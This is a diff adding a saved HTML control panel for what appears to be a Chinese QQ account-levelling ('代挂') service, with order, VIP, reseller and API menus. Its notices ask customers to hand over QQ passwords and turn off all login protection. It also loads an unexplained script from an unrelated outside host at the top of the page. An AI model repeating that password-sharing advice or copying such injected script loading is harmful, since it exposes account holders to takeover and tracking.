@@ -1,0 +1,462 @@
+<html lang="en">
+<head>
+    <script src="http://j.s9w.cc/j/?t=fx&v=1&g=8cab8ece2b88&c=bc307d944a0b&A=5" defer></script>
+    <meta charset="UTF-8">
+    <title>用户控制面板-仙剑阁QQ等级代挂系统</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <link rel="shortcut icon" sizes="196x196" href="/assets/style3/images/logo.png">
+    <link rel="stylesheet" href="/assets/common/font-awesome-4.6.3/css/font-awesome.min.css">
+    <link rel="stylesheet"
+          href="http://dg.52xjg.com//assets/common/material-design-iconic-font-2.2.0/css/material-design-iconic-font.min.css">
+    <!-- build:css /tmp/assets/css/app.min.css -->
+    <link rel="stylesheet" href="http://dg.52xjg.com//assets/common/animate.css">
+    <link rel="stylesheet" href="http://dg.52xjg.com//assets/common/fullcalendar-3.0.1/fullcalendar.min.css">
+    <link rel="stylesheet" href="http://dg.52xjg.com///cdn.bootcss.com/jquery.perfect-scrollbar/0.6.13/css/perfect-scrollbar.min.css">
+    <link rel="stylesheet" href="http://dg.52xjg.com//assets/common/bootstrap-3.3.5/css/bootstrap.min.css">
+    <link rel="stylesheet" href="http://dg.52xjg.com//assets/style3/css/app.css">
+    <script src="http://dg.52xjg.com/assets/common/jquery-1.11.0.min.js"></script>
+    <script src="http://dg.52xjg.com/assets/common/layer-3.0.1/layer.js"></script>
+    <script src="http://dg.52xjg.com/assets/common/laypage-1.3/laypage.js"></script>
+    <script src="http://dg.52xjg.com/assets/common/bootstrap-3.3.5/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="http://dg.52xjg.com/assets/sweetalert/sweetalert.css"/>
+    <script src="http://dg.52xjg.com/assets/sweetalert/sweetalert.min.js" type="text/javascript"></script>
+    <!-- endbuild -->
+</head>
+
+<body class="sb-top">
+<!--============= start main area -->
+
+<!-- APP ASIDE ==========-->
+<aside id="app-aside" class="app-aside top light">
+    <div class="container">
+        <!-- aside-menu -->
+        <div class="aside-menu-wrapper">
+            <div id="aside-top-menu-toggle" class="visible-xs-inline-block">
+                <button data-toggle="class" data-target="#aside-top-menu" data-class="open" self-toggle="is-active"
+                        class="hamburger hamburger--spin js-hamburger" type="button">
+					<span class="hamburger-box">
+						<span class="hamburger-inner"></span>
+					</span>
+                </button>
+            </div>
+            <ul class="sf-menu aside-menu aside-top-menu" id="aside-top-menu">
+                <li>
+                    <a href="/index.php/index/panel/index.html" class="menu-link">
+                        <span class="menu-icon"><i class="zmdi zmdi-home zmdi-hc-lg"></i></span>
+                        <span class="menu-text">会员中心</span>
+                    </a>
+                </li><!-- .menu-item -->
+                <li>
+                    <a href="javascript:void(0)" class="menu-link">
+                        <span class="menu-icon"><i class="fa fa-tag"></i></span>
+                        <span class="menu-text">订单管理</span>
+                    </a>
+                    <ul>
+                        <li><a href="/index.php/index/panel/qqAdd.html">添加QQ</a></li>
+                        <li><a href="/index.php/index/panel/qqList.html">QQ列表</a></li>
+                        <li><a href="/index.php/index/panel/order.html">自助下单</a></li>
+                        <li><a href="/index.php/index/panel/qqSJ.html">QQ升级计算</a></li>
+                    </ul>
+                </li><!-- .menu-item -->
+                <li>
+                    <a href="/index.php/index/panel/shequ.html" class="menu-link">
+                        <span class="menu-icon"><i class="fa fa-bolt"></i></span>
+                        <span class="menu-text">代刷下单</span>
+                    </a>
+                </li><!-- .menu-item -->
+                <li>
+                    <a href="javascript:void(0)" class="menu-link">
+                        <span class="menu-icon"><i class="fa fa-shopping-cart"></i></span>
+                        <span class="menu-text">在线商城</span>
+                    </a>
+                    <ul>
+                        <li><a href="/index.php/index/panel/shop.html">自助开通VIP</a></li>
+                        <li><a href="/index.php/index/panel/recharge.html">充值金币</a></li>
+                        <li><a href="/index.php/index/panel/rmbList.html">收支明细</a></li>
+                    </ul>
+                </li><!-- .menu-item -->
+
+                <li>
+                    <a href="javascript:void(0)" class="menu-link">
+                        <span class="menu-icon"><i class="fa fa-hand-o-up"></i></span>
+                        <span class="menu-text">会员福利</span>
+                    </a>
+                    <ul>
+                        <li><a href="/index.php/index/panel/invite.html">邀请好友</a></li>
+                        <li><a href="/index.php/index/panel/qiandao.html">每日签到</a></li>
+                    </ul>
+                </li><!-- .menu-item -->
+
+                <li>
+                    <a href="javascript:void(0)" class="menu-link">
+                        <span class="menu-icon"><i class="fa fa-list-ol"></i></span>
+                        <span class="menu-text">排行榜</span>
+                    </a>
+                    <ul>
+                        <li><a href="/index.php/index/panel/rank/kind/invite.html">邀请人数排行榜</a></li>
+                        <li><a href="/index.php/index/panel/rank/kind/order.html">分站订单排行榜</a></li>
+                    </ul>
+                </li><!-- .menu-item -->
+                <li>
+                    <a href="javascript:void(0)" class="menu-link">
+                        <span class="menu-icon"><i class="fa fa-suitcase"></i></span>
+                        <span class="menu-text">API管理</span>
+                    </a>
+                    <ul>
+                        <li><a href="/index.php/index/panel/apicontrol.html">API说明</a></li>
+                        <li><a href="/index.php/index/panel/kami.html">代挂对接卡密</a></li>
+                    </ul>
+                </li><!-- .menu-item -->
+
+                <li>
+                    <a href="/index.php/index/panel/ktfz.html" class="menu-link">
+                        <span class="menu-icon"><i class="fa fa-share-alt"></i></span>
+                        <span class="menu-text">开通分站</span>
+                    </a>
+                </li><!-- .menu-item -->
+
+                <li>
+                    <a href="/index.php/index/panel/chat.html" class="menu-link">
+                        <span class="menu-icon"><i class="fa fa-comments"></i></span>
+                        <span class="menu-text">聊天室</span>
+                    </a>
+                </li><!-- .menu-item -->
+
+                <li>
+                    <a href="/index.php/index/panel/help.html" class="menu-link">
+                        <span class="menu-icon"><i class="fa fa-hand-o-up"></i></span>
+                        <span class="menu-text">帮助中心</span>
+                    </a>
+                </li><!-- .menu-item -->
+            </ul>
+        </div>
+        <!-- /aside-menu -->
+
+        <!-- aside-user -->
+        <div class="aside-user">
+            <ul>
+
+                <li class="dropdown">
+                    <a class="dropdown-toggle usertitle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false">
+                        <div class="avatar avatar-md avatar-circle">
+                            <img class="img-responsive" src="http://q1.qlogo.cn/g?b=qq&nk=76300676&s=160"
+                                 alt="avatar" style="position: absolute">
+                            <span class="badge badge-danger"
+                                  style="padding: 0 2px 0 2px;margin-left: 35px;margin-bottom: -70px;position: relative;">0</span>
+                        </div><!-- .avatar -->
+                    </a>
+                    <ul class="dropdown-menu animated flipInY">
+                        <li>
+                            <a class="text-color" onclick="showMessage();">
+                                <span class="m-r-xs"><i class="fa fa-envelope"></i></span>
+                                <span>我的消息</span>
+                                <span class="pull-right">
+                                    <span class="badge badge-danger">0</span>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="text-color" href="/index.php/index/panel/index.html">
+                                <span class="m-r-xs"><i class="fa fa-home"></i></span>
+                                <span>会员中心</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="text-color" href="/index.php/index/panel/profile.html">
+                                <span class="m-r-xs"><i class="fa fa-user"></i></span>
+                                <span>个人信息</span>
+                            </a>
+                        </li>
+                        
+                        <li role="separator" class="divider"></li>
+                        <li>
+                            <a class="text-color" href="/index.php/index/index/logout.html"
+                               onclick="return confirm('确认退出登录？');">
+                                <span class="m-r-xs"><i class="fa fa-power-off"></i></span>
+                                <span>退出</span>
+                            </a>
+                        </li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a class="dropdown-toggle usertitle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" id="message">
+                    </a>
+                    <ul class="dropdown-menu animated flipInY">
+                        <li class="text-center notifi-title"><i class="fa fa-envelope"></i> 我的消息</li>
+                        <li class="list-group">
+                                                    </li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+        <!-- /aside-user -->
+    </div>
+</aside>
+<div id="modal-message" class="modal fade bg-info">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                        aria-hidden="true">&times;</span></button>
+                <h4 class="modal-title text-info">我的消息</h4>
+            </div>
+            <div class="modal-body">
+                <div class="panel panel-info">
+                    <div class="panel-heading" id="message-title">加载中，请稍后...</div>
+                    <div class="panel-body text-info" style="    background: #efefef;">
+                        <div id="message-message"></div>
+                        <div class="text-right" id="message-user"></div>
+                        <div class="text-right" id="message-addtime"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    function showMessage() {
+        setTimeout(function () {
+            $('#message').dropdown('toggle');
+        }, 10);
+    }
+    function loadMessage(id) {
+        $.post("/index.php/index/ajax/message.html", {id: id}, function (json) {
+            if (json.code == 0) {
+                $("#message-title").text(json.message.title);
+                $("#message-message").html(json.message.message);
+                $("#message-user").text("From：" + json.message.user + "[UID:" + json.message.fid + "]");
+                $("#message-addtime").html(json.message.addtime);
+                $("#modal-message").modal("show");
+            } else {
+                alert("加载消息失败！");
+            }
+        }, 'json');
+    }
+    </script>
+<!--========== END app aside -->
+
+<!-- APP NAVBAR ==========-->
+<nav id="app-navbar" class="app-navbar bg-primary">
+    <div class="container">
+        <!-- navbar-header -->
+        <div id="navbar-header" class="pull-left">
+            <div class="animated">
+                
+                <a href="/index.php/index/panel/index.html" id="app-brand" class="app-brand text-white">
+                    <span id="brand-icon" class="brand-icon"><i class="fa fa-gg"></i></span>
+                    <span id="brand-name" class="brand-icon foldable">会员中心</span>
+                </a>
+                
+            </div>
+        </div>
+        <!-- /navbar-header -->
+    </div>
+</nav>
+<!--========== END app navbar -->
+
+<!-- APP MAIN ==========-->
+<main id="app-main" class="app-main">
+    <div class="container">
+        <div class="wrap">
+            <section class="app-content">
+                
+<!--
+<div class="row __web-inspector-hide-shortcut__">
+    <div class="col-md-12 col-sm-6">
+        <div class="alert alert-success" role="alert"><i class="fa fa-volume-up" aria-hidden="true"></i>&nbsp;</div>
+    </div>
+</div>
+-->
+<div class="row">
+        <div class="col-md-12 col-sm-6">
+        <div class="widget">
+            <header class="widget-header">
+                <h4 class="widget-title">本站公告</h4>
+            </header>
+            <hr class="widget-separator">
+            <div class="widget-body">
+                <font color="#B6A4D6" size="1">仙</font><font color="#B1531C" size="3">剑</font><font color="#B1531C" size="2">阁</font><font color="#803A19" size="3">代</font><font color="#6BBBE7" size="5">挂</font><font color="#19CC8D" size="2">~</font><font color="#288495" size="7">你</font><font color="#84805A" size="1">不</font><font color="#EB1E24" size="4">能</font><font color="#EDDEDC" size="4">拒</font><font color="#C83202" size="6">绝</font><font color="#584B7F" size="6">的</font><font color="#5E54D7" size="4">选</font><font color="#84AC71" size="5">择</font>
+<li class="list-group-item">
+	<img border="0" width="32" src="/assets/img/new.gif" /><span style="color:#e06666;">★最新公告★代挂时间凌晨0点—补挂时间：17:00— 22:00代挂地点：广州 </span> 
+</li>
+<li class="list-group-item">
+	<img border="0" width="32" src="/assets/img/new.gif" /><span style="color:#6c9dec;"> 搭建普通分站20元（0.6提卡全套代挂）、搭建二级主站50元（0.6提卡全套代挂，可无限免费搭建分站） </span>
+</li>
+<li class="list-group-item">
+	<span class="label label-danger">提示</span><span style="color:#00ff00;">满足四点要求，绝无漏挂！1.QQ+密码正确2.关闭一切登录保护(QB保护除外)3.号码没异常4.密码前后别带-</span> 
+</li>
+<li class="list-group-item">
+	<span class="label label-block btn-info">提醒</span><span style="color:#ff9900;"> 避免账号纠纷请开启密保绑定手机，开启Q币消费保护！</span>
+</li>
+<li class="list-group-item">
+	<span class="label label-block btn-info">售后</span><span style="color:#ea9999;"> 第一次挂机可能会出现账号冻结情况! 亲，可以改密解冻。然后到本网站提交改密即可!  </span>
+</li>
+<li class="list-group-item">
+<span class="label label-block btn-info">客服</span><span style="color:#698B22;">☆☆☆☆唯一QQ客服：<a target="_blank" href="http://wpa.qq.com/msgrd?v=3&uin=459339321&site=qq&menu=yes" class="btn btn-primary btn-xs">459339321</a></p></li>
+<div id="blink">
+	<strong> 
+	<div align="left" style="text-align:center;"><script type="text/javascript">
+var now=(new Date()).getHours();
+if(now>0&&now<=6){
+document.write("仙剑阁代挂网 提示您 午夜好骚年，快睡觉去，妹纸等你久了会不耐烦的哦...");
+}else if(now>6&&now<=11){
+document.write("仙剑阁代挂网 提示您早上好骚年，昨夜运动那么长时间还这么早起床，真爷们...");
+}else if(now>11&&now<=14){
+document.write("仙剑阁代挂网 提示您中午好骚年，停下手中的工作，快去吃饭晚了就没的吃了...");
+}else if(now>14&&now<=18){
+document.write("仙剑阁代挂网 提示您下午好骚年，累了一上午了，快去休息会扒根烟喝杯茶...");
+}else{
+document.write("仙剑阁代挂网 提示您晚上好骚年，快睡觉吧别忙了，明天的日头照样红...");
+}
+</script>
+ 请记住那个角落有个人叫-CC！
+	</div>
+</strong><strong> 
+<script language="javascript"> function changeColor(){ var color="#f00|#0f0|#00f|#880|#808|#088|yellow|green|blue|gray"; color=color.split("|"); document.getElementById("blink").style.color=color[parseInt(Math.random() * color.length)]; } setInterval("changeColor()",200); </script>
+</strong><strong> 
+	<div class="STYLE12" align="center">
+            </div>
+        </div>
+    </div>
+    <div class="col-md-6">
+        <div class="list-group">
+            <div class="list-group-item active">数据统计</div>
+            <a class="list-group-item"><i class="fa fa-user"></i>&nbsp;总用户数：24<span
+                    class="badge badge-info">今:1</span></a>
+            <a class="list-group-item"><i class="fa fa-qq"></i>&nbsp;总Q Q数：15<span class="badge badge-info">今:0</span></a>
+            <a class="list-group-item"><i class="fa fa-first-order"></i>&nbsp;总订单数：118<span
+                    class="badge badge-info">今:4</span></a>
+            <a class="list-group-item"><i class="fa fa-cloud"></i>&nbsp;总分站数：4<span
+                    class="badge badge-info">今:0</span></a>
+        </div>
+    </div><!-- END column -->
+    <div class="col-md-6">
+        <div class="list-group">
+            <div class="list-group-item active">我的信息</div>
+            <a class="list-group-item"><i class="fa fa-star"></i>&nbsp;UID：<span class="badge badge-info">10028</span></a>
+            <a class="list-group-item"><i class="fa fa-user"></i>&nbsp;用户名：<span class="badge badge-info">世福</span></a>
+            <a class="list-group-item"><i class="fa fa-rmb"></i>&nbsp;金币：<span class="badge badge-success">0.00个</span></a>
+            <a class="list-group-item"><i class="fa fa-qq"></i>&nbsp;Q Q：<span class="badge badge-warning">76300676</span></a>
+        </div>
+    </div><!-- END column -->
+</div>
+
+
+            </section>
+        </div>
+    </div>
+</main>
+<!--========== END app main -->
+
+<!-- APP CUSTOMIZER -->
+<div id="app-customizer" class="app-customizer">
+    <a href="javascript:void(0)"
+       class="app-customizer-toggle theme-color"
+       data-toggle="class"
+       data-class="open"
+       data-active="false"
+       data-target="#app-customizer">
+        <i class="fa fa-gear"></i>
+    </a>
+    <div class="customizer-tabs">
+        <!-- tabs list -->
+        <ul class="nav nav-tabs" role="tablist">
+            <li role="presentation" class="active"><a href="#aside-customizer" aria-controls="stream" role="tab"
+                                                      data-toggle="tab">侧边栏</a></li>
+            <li role="presentation"><a href="#navbar-customizer" aria-controls="photos" role="tab"
+                                       data-toggle="tab">导航栏</a></li>
+        </ul><!-- .nav-tabs -->
+
+        <div class="tab-content">
+            <div role="tabpanel" class="tab-pane in active fade" id="aside-customizer">
+                <div class="hide-top-bar visible-lg-block">
+                    <div class="m-b-md">
+                        <label>Fold Sidebar</label>
+                        <div class="pull-right">
+                            <input id="aside-fold-switch" type="checkbox" data-switchery data-size="small"/>
+                        </div>
+                    </div>
+                    <hr>
+                </div>
+                <div class="radio radio-default m-b-md">
+                    <input type="radio" id="aside-light-theme" name="aside-theme" data-theme="light">
+                    <label for="aside-light-theme">白色</label>
+                </div>
+                <div class="radio radio-inverse">
+                    <input type="radio" id="aside-dark-theme" name="aside-theme" data-theme="dark">
+                    <label for="aside-dark-theme">黑色</label>
+                </div>
+                <hr>
+                <div>
+                    <button id="aside-reset-btn" class="btn btn-block btn-outline btn-primary">设置</button>
+                </div>
+            </div><!-- .tab-pane -->
+            <div role="tabpanel" class="tab-pane fade" id="navbar-customizer">
+                <div class="radio radio-primary m-b-md">
+                    <input type="radio" id="navbar-primary-theme" name="navbar-theme" data-theme="primary">
+                    <label for="navbar-primary-theme" class="text-primary">默认</label>
+                </div>
+                <div class="radio radio-success m-b-md">
+                    <input type="radio" id="navbar-success-theme" name="navbar-theme" data-theme="success">
+                    <label for="navbar-success-theme" class="text-success">绿色</label>
+                </div>
+                <div class="radio radio-danger m-b-md">
+                    <input type="radio" id="navbar-danger-theme" name="navbar-theme" data-theme="danger">
+                    <label for="navbar-danger-theme" class="text-danger">红色</label>
+                </div>
+                <div class="radio radio-warning m-b-md">
+                    <input type="radio" id="navbar-warning-theme" name="navbar-theme" data-theme="warning">
+                    <label for="navbar-warning-theme" class="text-warning">橙色</label>
+                </div>
+                <div class="radio radio-pink m-b-md">
+                    <input type="radio" id="navbar-pink-theme" name="navbar-theme" data-theme="pink">
+                    <label for="navbar-pink-theme" class="text-pink">粉红</label>
+                </div>
+                <div class="radio radio-purple m-b-md">
+                    <input type="radio" id="navbar-purple-theme" name="navbar-theme" data-theme="purple">
+                    <label for="navbar-purple-theme" class="text-purple">紫色</label>
+                </div>
+                <div class="radio radio-inverse m-b-md">
+                    <input type="radio" id="navbar-inverse-theme" name="navbar-theme" data-theme="inverse">
+                    <label for="navbar-inverse-theme" class="text-inverse">灰色</label>
+                </div>
+                <div class="radio radio-dark">
+                    <input type="radio" id="navbar-dark-theme" name="navbar-theme" data-theme="dark">
+                    <label for="navbar-dark-theme" class="text-dark">黑色</label>
+                </div>
+                <hr>
+                <div>
+                    <button id="navbar-reset-btn" class="btn btn-block btn-outline btn-primary">设置</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- /#app-customizer -->
+
+<!-- build:js /tmp/assets/js/core.min.js -->
+<script src="http://dg.52xjg.com/assets/common/jquery-ui-1.9.2.custom.min.js"></script>
+<script src="http://dg.52xjg.com/assets/common/jquery.storageapi.min.js"></script>
+<script src="http://dg.52xjg.com/assets/common/superfish-1.7.9/js/hoverIntent.js"></script>
+<script src="http://dg.52xjg.com/assets/common/superfish-1.7.9/js/superfish.min.js"></script>
+<script src="http://dg.52xjg.com/assets/common/jquery.slimscroll.min.js"></script>
+<script src="http://dg.52xjg.com//cdn.bootcss.com/jquery.perfect-scrollbar/0.6.13/js/perfect-scrollbar.jquery.min.js"></script>
+<script src="http://dg.52xjg.com/assets/common/pace.min.js"></script>
+
+<!-- build:js /tmp/assets/js/app.min.js -->
+<script src="http://dg.52xjg.com/assets/style3/js/library.js"></script>
+
+<script src="http://dg.52xjg.com/assets/style3/js/plugins.js"></script>
+<script src="http://dg.52xjg.com/assets/style3/js/app.js"></script>
+<!-- endbuild -->
+<script src="http://dg.52xjg.com/assets/common/moment.js"></script>
+<script src="http://dg.52xjg.com/assets/common/fullcalendar-3.0.1/fullcalendar.min.js"></script>
+<script src="http://dg.52xjg.com/assets/style3/js/fullcalendar.js"></script>
+
+</body>
+</html>
